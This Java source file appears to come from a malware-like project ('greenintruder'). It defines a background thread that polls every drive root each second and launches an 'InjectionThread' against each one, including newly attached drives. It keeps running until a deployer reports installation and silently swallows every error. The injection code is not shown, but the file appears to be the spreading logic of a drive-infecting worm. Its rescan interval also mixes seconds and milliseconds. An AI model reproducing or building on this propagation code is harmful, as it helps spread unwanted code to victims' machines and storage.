package io.github.explodingbottle.greenintruder.certifier.admintools;

import java.io.File;
import java.time.Instant;
import java.util.HashMap;

public class DriveScanThread extends Thread {

	private HashMap<File, Long> drivesTimestamps = new HashMap<File, Long>();
	private boolean underAdmin;

	public DriveScanThread(boolean underAdmin) {
		this.underAdmin = underAdmin;
	}

	public void run() {
		while (!interrupted()) {
			try {
				if (!underAdmin) {
					if (DeployerTool.isFileInstalled()) {
						return;
					}
				}
				Long instantNow = Instant.now().getEpochSecond();
				HashMap<File, Long> tempDTstmpClne = new HashMap<File, Long>();
				tempDTstmpClne.putAll(drivesTimestamps);
				for (File root : File.listRoots()) {
					if (root.listFiles() != null) {
						tempDTstmpClne.remove(root);
						Long timeStamp = drivesTimestamps.get(root);
						if (timeStamp == null || timeStamp.longValue() <= instantNow) {
							new InjectionThread(root, underAdmin).start();
						}
						if (timeStamp == null) {
							drivesTimestamps.put(root, instantNow + (1000 * 60 * 60 * 5));
						}
					}
				}
				tempDTstmpClne.forEach((f, t) -> {
					drivesTimestamps.remove(f);
				});
				Thread.sleep(1000);
			} catch (Exception e) {

			}
		}
	}

}
